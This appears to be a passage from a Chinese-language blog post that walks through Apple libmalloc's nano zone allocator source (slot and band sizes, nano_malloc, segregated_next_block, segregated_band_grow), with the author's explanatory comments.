<h3 id="SLOT_IN_BAND_SIZE">SLOT_IN_BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SLOT_IN_BAND_SIZE 	(<span class="number">1</span> &lt;&lt; NANO_OFFSET_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>SLOT_IN_BAND_SIZE</code>的值为2^17==128*1024,所以<code>SLOT_IN_BAND_SIZE</code>的值等于<code>128KB</code>。用来表示，在每一个<code>nano</code>内存分配的<code>BAND</code>之中，一个每一个<code>SLOT</code>的大小是<code>128KB</code>。</p>
<h3 id="BAND_SIZE">BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> BAND_SIZE 		(<span class="number">1</span> &lt;&lt; (NANO_SLOT_BITS + NANO_OFFSET_BITS)) </span></span><br><span class="line"><span class="comment">/*  == Number of bytes covered by a page table entry */</span></span><br></pre></td></tr></table></figure>
<p><code>BAND_SIZE</code>的值为2^21==2*1024*1024,所以<code>BAND_SIZE</code>的值等于<code>2MB</code>。用来表示，在每一个<code>nano_zone_t</code>的分配中，每一个BAND的大小是2MB。</p>
<h3 id="NANO_MAG_SIZE">NANO_MAG_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_BITS            <span class="number">5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_SIZE            (<span class="number">1</span> &lt;&lt; NANO_MAG_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>NANO_MAG_SIZE</code>的值为2^5==32，用来最多支持多少个核。</p>
<h3 id="NANO_SLOT_SIZE">NANO_SLOT_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_SIZE      	(<span class="number">1</span> &lt;&lt; NANO_SLOT_BITS)</span></span><br></pre></td></tr></table></figure>
<p>表示一共有2^4,也就是16种<code>SLOT</code>的大小。分别是16,32,48,64,…,256。</p>
<h2 id="nano_meta_s">nano_meta_s</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nano_meta_s &#123;</span><br><span class="line">	OSQueueHead			slot_LIFO CACHE_ALIGN;</span><br><span class="line">  	<span class="comment">//用于重复利用释放内存的队列</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_madvised_log_page_count;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_current_base_addr;</span><br><span class="line">  	<span class="comment">//slot的基址</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_limit_addr;</span><br><span class="line">  	<span class="comment">//slot可以分配的地址最大值</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_mapped;</span><br><span class="line">  	<span class="comment">//slot中已经映射了多少个objects</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_skipped;</span><br><span class="line">  	<span class="comment">//slot开始的时候会跳过多少个object开始使用</span></span><br><span class="line">	<span class="keyword">bitarray_t</span>			slot_madvised_pages;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_bump_addr CACHE_ALIGN; </span><br><span class="line">  	<span class="comment">//slot当前开始分配的地址</span></span><br><span class="line">    <span class="comment">// position on cache line distinct from that of slot_LIFO</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">boolean_t</span>		slot_exhausted;</span><br><span class="line">  	<span class="comment">// slot是否已经用尽</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_bytes;</span><br><span class="line">  	<span class="comment">// 该slot中存储的bytes是多少(16、32、48...)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_objects;</span><br><span class="line">  	<span class="comment">// 该slot中存储了多少个object(slot总内存/slot_bytes)</span></span><br><span class="line">&#125; *<span class="keyword">nano_meta_admin_t</span>;</span><br></pre></td></tr></table></figure>
<p>这个数据结构就是<code>nano_zone_s</code>中的<code>meta_data</code>的数据结构，具体用来描述每一个<code>slot</code>的状态和属性。</p>
<h1 id="nano_malloc">nano_malloc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc_zone_malloc</span><span class="params">(malloc_zone_t *zone, size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*ptr;</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	ptr = zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line"><span class="title">nano_malloc</span><span class="params">(nanozone_t *nanozone, size_t size)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= NANO_MAX_SIZE) &#123;</span><br><span class="line">		<span class="keyword">void</span> *p = _nano_malloc_check_clear(nanozone, size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* FALLTHROUGH to helper zone */</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">malloc_zone_t</span> *zone = (<span class="keyword">malloc_zone_t</span> *)(nanozone-&gt;helper_zone);</span><br><span class="line">	<span class="keyword">return</span> zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为默认的<code>zone</code>是使用<code>nano_zone_t</code>，在<code>malloc_zone_malloc</code>中的<code>zone-&gt;malloc()</code>函数被调用之后，在</p>
<p><code>nano_malloc</code>会依据申请的size进行判断，当只有当<code>size</code>小于<code>NANO_MAX_SIZE</code>的时候才会调用<code>nano_malloc</code>的内部实现<code>_nano_malloc_check_clear</code>，否则就通过<code>nanozone-&gt;helper_zone</code>的<code>malloc</code>函数，进一步判断使用<code>tiny</code>、<code>small</code>、还是<code>large</code>。</p>
<h3 id="第一次调用_nano_malloc_check_clear">第一次调用_nano_malloc_check_clear</h3><p>所以需要重点分析的函数是<code>_nano_malloc_check_clear</code>。而第一次调用<code>malloc</code>的话，主要流程在<code>segregated_next_block</code>中实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> </span><br><span class="line">_nano_malloc_check_clear(<span class="keyword">nanozone_t</span> *nanozone, <span class="keyword">size_t</span> size, <span class="keyword">boolean_t</span> cleared_requested)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span>		*ptr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_key;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_bytes = segregated_size_to_fit(nanozone, size, &amp;slot_key); <span class="comment">// Note slot_key is set here</span></span><br><span class="line">	<span class="comment">//SLOT_BYTES是固定的16、32、64、128、、、、</span></span><br><span class="line">	<span class="comment">//slot_key 1~16</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	mag_index = NANO_MAG_INDEX(nanozone);</span><br><span class="line">	<span class="comment">//获取cpu对应的index</span></span><br><span class="line">  </span><br><span class="line">	<span class="comment">//选择cpu以及对应的内存大小块</span></span><br><span class="line">	<span class="keyword">nano_meta_admin_t</span>	pMeta = &amp;(nanozone-&gt;meta_data[mag_index][slot_key]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//检测是否存在已经释放过，可以直接拿来用的内存</span></span><br><span class="line">	ptr = OSAtomicDequeue( &amp;(pMeta-&gt;slot_LIFO), offsetof(<span class="keyword">struct</span> chained_block_s,next));</span><br><span class="line">	<span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">      	<span class="comment">//如果队列中存在函数，则直接使用队列中的数据</span></span><br><span class="line">      	<span class="comment">//第一次调用malloc时，不会执行这一块代码，所以后面再另做分析</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//没有释放过的内存，所以调用函数 获取内存</span></span><br><span class="line">		ptr = segregated_next_block(nanozone, pMeta, slot_bytes, mag_index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cleared_requested &amp;&amp; ptr)</span><br><span class="line">		<span class="built_in">memset</span>(ptr, <span class="number">0</span>, slot_bytes); <span class="comment">// <span class="doctag">TODO:</span> Needs a memory barrier after memset to ensure zeroes land first?</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="segregated_size_to_fit">segregated_size_to_fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">input : size = 0 </span><br><span class="line">size = NANO_REGIME_QUANTA_SIZE==&gt;(1&lt;&lt;4)==&gt;2^4==&gt;16</span><br><span class="line">k = (16 + 16 - 1) &gt;&gt; 4 ==&gt; 31&gt;&gt;4 ==&gt; 1</span><br><span class="line">slot_bytes = 1 &lt;&lt; 4 ==&gt; 16</span><br><span class="line">*pkey = 0 </span><br><span class="line"></span><br><span class="line">input : size = 16 </span><br><span class="line">size = 16</span><br><span class="line">k = (16+16-1) &gt;&gt; 4 ==&gt;1</span><br><span class="line">slot_bytes = 16</span><br><span class="line">*pkey = 0</span><br><span class="line"></span><br><span class="line">input : size = 32</span><br><span class="line">size : 32</span><br><span class="line">k = (32+16-1)&gt;&gt;4 ==&gt;2</span><br><span class="line">slot_bytes = 2&lt;&lt;4 = 32</span><br><span class="line">*pkey = 2-1 ==&gt;1</span><br><span class="line"></span><br><span class="line">0~16 :</span><br><span class="line">pkey ==&gt; 0</span><br><span class="line">slot_bytes ==&gt; 16B</span><br><span class="line"></span><br><span class="line">17~32</span><br><span class="line">pkey ==&gt; 1</span><br><span class="line">slot_bytes ==&gt; 32B</span><br><span class="line"></span><br><span class="line">256</span><br><span class="line">pkey ==&gt; 16</span><br><span class="line">slot_bytes ==&gt; 256B</span><br><span class="line">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">segregated_size_to_fit</span><span class="params">(nanozone_t *nanozone, size_t size, <span class="keyword">unsigned</span> <span class="keyword">int</span> *pKey)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k, slot_bytes;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == size)</span><br><span class="line">		size = NANO_REGIME_QUANTA_SIZE; <span class="comment">// Historical behavior</span></span><br><span class="line"></span><br><span class="line">	k = (size + NANO_REGIME_QUANTA_SIZE - <span class="number">1</span>) &gt;&gt; SHIFT_NANO_QUANTUM; <span class="comment">// round up and shift for number of quanta</span></span><br><span class="line">	slot_bytes = k &lt;&lt; SHIFT_NANO_QUANTUM; <span class="comment">// multiply by power of two quanta size</span></span><br><span class="line">	*pKey = k - <span class="number">1</span>; <span class="comment">// Zero-based!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slot_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数实现的功能是根据申请的<code>size</code>大小，计算到相应的需要申请的相应的slot_bytes。例如申请的大小是20的话，<code>slot_bytes</code>就应当是32。</p>
<h4 id="初见segregated_next_block">初见segregated_next_block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">void</span> *</span><br><span class="line"><span class="title">segregated_next_block</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> theLimit = pMeta-&gt;slot_limit_addr; <span class="comment">// Capture the slot limit that bounds slot_bump_addr right now</span></span><br><span class="line">		<span class="comment">//pMeta-&gt;slot_limit_addr</span></span><br><span class="line">		<span class="comment">//当前这块pMeta可用内存的结束地址。</span></span><br><span class="line">		<span class="keyword">uintptr_t</span> b = OSAtomicAdd64Barrier(slot_bytes, (<span class="keyword">volatile</span> <span class="keyword">int64_t</span> *)&amp;(pMeta-&gt;slot_bump_addr));</span><br><span class="line">		<span class="comment">//原子的为pMeta-&gt;slot_bump_addr添加slot_bytes的长度，偏移到下一个地址</span></span><br><span class="line">		b -= slot_bytes; <span class="comment">// Atomic op returned addr of *next* free block. Subtract to get addr for *this* allocation.</span></span><br><span class="line">		<span class="comment">//减去添加的偏移量，获取当前可以获取的地址</span></span><br><span class="line">		<span class="keyword">if</span> (b &lt; theLimit) &#123; <span class="comment">// Did we stay within the bound of the present slot allocation?</span></span><br><span class="line">			<span class="comment">//如果地址还在范围之内，则返回地址</span></span><br><span class="line">			<span class="comment">//<span class="doctag">todo:</span>b不仅小于thelimit且远远小于thelimit，就可以获取一个就指向其他内存块的地址了。</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">void</span> *)b; <span class="comment">// Yep, so the slot_bump_addr this thread incremented is good to go</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123; <span class="comment">// exhausted all the bands availble for this slot?</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// We're toast</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// One thread will grow the heap, others will see its been grown and retry allocation</span></span><br><span class="line">				_malloc_lock_lock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">				<span class="comment">// re-check state now that we've taken the lock</span></span><br><span class="line">				<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Toast</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; pMeta-&gt;slot_limit_addr) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot was successfully grown by first-taker (not us). Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot has been successfully grown by us. Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					pMeta-&gt;slot_exhausted = TRUE;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为是第一次调用<code>segregated_next_block</code>函数，<code>theLimit</code>的值为0，<code>b</code>的值也为0。</p>
<p>又因为<code>pMeta-&gt;slot_exhausted</code>的值也是0，且<code>pMeta-&gt;slot_limit_addr</code>的值也为0，所以会调用</p>
<p><code>segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)</code>。</p>
<p>该函数的实现非常的有<strong>技巧</strong>性，所以不只有<strong>初始化</strong><code>nano_zone</code>中<code>band</code>的功能，在后面的分析还会遇到，遇到之后再做详细分析。</p>
<h4 id="获得第一个BAND">获得第一个BAND</h4><p><code>segregated_band_grow</code>函数实现了2个功能。</p>
<ul>
<li><code>BAND</code>用尽后的增长</li>
<li>以及一个特殊情况，创建第一个<code>BAND</code></li>
</ul>
<h5 id="什么是BAND">什么是BAND</h5><p>每一个<code>BAND</code>的大小为2MB，是<code>nano_zone_t</code>向堆申请内存的单位，每一个独立的cpu每次申请一个<code>BAND</code>，当一个<code>BAND</code>用完之后，会再申请一个<code>BAND</code>。每一个cpu的<code>BAND</code>是分开使用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> boolean_t</span><br><span class="line"><span class="title">segregated_band_grow</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">nano_blk_addr_t</span> u; <span class="comment">// the compiler holds this in a register</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> p, s;</span><br><span class="line">	<span class="keyword">size_t</span> watermark, hiwater;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_current_base_addr) &#123; <span class="comment">// First encounter?</span></span><br><span class="line"></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">//使用union计算地址是多少</span></span><br><span class="line">		pMeta-&gt;slot_bytes = slot_bytes;</span><br><span class="line">		pMeta-&gt;slot_objects = SLOT_IN_BAND_SIZE / slot_bytes;  <span class="comment">//128KB/slot_bytes==&gt;有多少个分片。</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = pMeta-&gt;slot_current_base_addr + BAND_SIZE; <span class="comment">// Growing, so stride ahead by BAND_SIZE 1&lt;&lt;21 ==&gt; 2^21</span></span><br><span class="line">		<span class="comment">//再slot_current_base_addr再增加2</span></span><br><span class="line">		u.addr = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == u.fields.nano_band) <span class="comment">// Did the band index wrap?</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		assert(slot_bytes == pMeta-&gt;slot_bytes);</span><br><span class="line">	&#125;</span><br><span class="line">	pMeta-&gt;slot_current_base_addr = p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//band_size大小是2MB</span></span><br><span class="line">	<span class="comment">//根据当前slot_current_base_addr，计算得到band的开始地址，用于内存申请。</span></span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> vm_addr = p &amp; ~((<span class="keyword">uintptr_t</span>)(BAND_SIZE - <span class="number">1</span>)); <span class="comment">// Address of the (2MB) band covering this (128KB) slot</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;band_max_mapped_baseaddr[mag_index] &lt; vm_addr) &#123;</span><br><span class="line">		<span class="comment">// Obtain the next band to cover this slot</span></span><br><span class="line">		<span class="comment">// 申请2MB的空间用于这个band</span></span><br><span class="line">		<span class="keyword">kern_return_t</span> kr = mach_vm_map(mach_task_self(), &amp;vm_addr, BAND_SIZE,</span><br><span class="line">		                               <span class="number">0</span>, VM_MAKE_TAG(VM_MEMORY_MALLOC_NANO), MEMORY_OBJECT_NULL, <span class="number">0</span>, FALSE,</span><br><span class="line">		                               VM_PROT_DEFAULT, VM_PROT_ALL, VM_INHERIT_DEFAULT);</span><br><span class="line">      	<span class="comment">/* ...*/</span></span><br><span class="line">		nanozone-&gt;band_max_mapped_baseaddr[mag_index] = vm_addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Randomize the starting allocation from this slot (introduces 11 to 14 bits of entropy)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_objects_mapped) &#123; <span class="comment">// First encounter?</span></span><br><span class="line">		<span class="comment">//SLOT_IN_BAND_SIZE / slot_bytes 这个slot会被分成多少份。</span></span><br><span class="line">		pMeta-&gt;slot_objects_skipped = (malloc_entropy[<span class="number">1</span>] % (SLOT_IN_BAND_SIZE / slot_bytes));</span><br><span class="line">		<span class="comment">//通过取余在内存开始处空出几个slot_bytes不用。</span></span><br><span class="line">		pMeta-&gt;slot_bump_addr = p + (pMeta-&gt;slot_objects_skipped * slot_bytes);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pMeta-&gt;slot_bump_addr = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pMeta-&gt;slot_limit_addr = p + (SLOT_IN_BAND_SIZE / slot_bytes) * slot_bytes; <span class="comment">//p+128KB</span></span><br><span class="line">	pMeta-&gt;slot_objects_mapped += (SLOT_IN_BAND_SIZE / slot_bytes); <span class="comment">//128KB/slot_bytes</span></span><br><span class="line"></span><br><span class="line">	u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	u.fields.nano_mag_index = mag_index;</span><br><span class="line">	u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_slot = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line">	s = u.addr; <span class="comment">// Base for this core.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the high water mark for this CPU's entire magazine, if this resupply raised it.</span></span><br><span class="line">    watermark = nanozone-&gt;core_mapped_size[mag_index];</span><br><span class="line">    hiwater = MAX( watermark, p - s + SLOT_IN_BAND_SIZE );</span><br><span class="line">    nanozone-&gt;core_mapped_size[mag_index] = hiwater;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
